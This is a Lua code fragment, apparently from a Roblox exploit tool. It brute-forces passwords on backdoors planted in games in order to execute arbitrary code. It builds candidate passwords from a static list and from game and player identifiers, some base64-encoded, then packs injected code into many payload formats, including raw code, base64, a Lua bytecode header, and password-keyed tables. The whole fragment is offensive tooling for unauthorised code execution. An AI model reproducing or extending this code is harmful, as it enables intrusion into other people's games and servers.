local function getDynamicPasswords()
    -- Use a hash map to prevent duplicates
    local pMap = {}
    local pwds = {}
    local function add(v)
        local sv = tostring(v)
        if not pMap[sv] and sv ~= "" then
            pMap[sv] = true
            table.insert(pwds, sv)
        end
    end

    -- Add static
    for _, p in ipairs(MODERN_PASSWORDS) do add(p) end
    
    -- Add dynamic environment data (extremely common in custom backdoors)
    add(game.PlaceId)
    add(game.CreatorId)
    add(game.Name)
    add(localPlayer.Name)
    add(localPlayer.UserId)
    
    -- Add base64 encoded versions of environment data
    add(base64Encode(tostring(game.PlaceId)))
    add(base64Encode(localPlayer.Name))
    
    return pwds
end

local function buildPasswordPayloads(code)
    local p = {}
    local pwds = getDynamicPasswords()
    local b64Code = base64Encode(code)
    
    -- Tier 1: Raw code & B64 code
    table.insert(p, {code})
    table.insert(p, {b64Code})
    table.insert(p, {"\27LuaQ", code})
    
    -- Tier 2: Password brute-forcing
    for _, pwd in ipairs(pwds) do
        -- Strings
        table.insert(p, {pwd, code})
        table.insert(p, {code, pwd})
        table.insert(p, {pwd, b64Code})
        
        -- Tables
        table.insert(p, {{[pwd] = code}})
        table.insert(p, {{Key = pwd, Payload = code}})
        table.insert(p, {{Auth = pwd, Code = code}})
        table.insert(p, {{Password = pwd, Run = code}})
    end
    
    return p
end

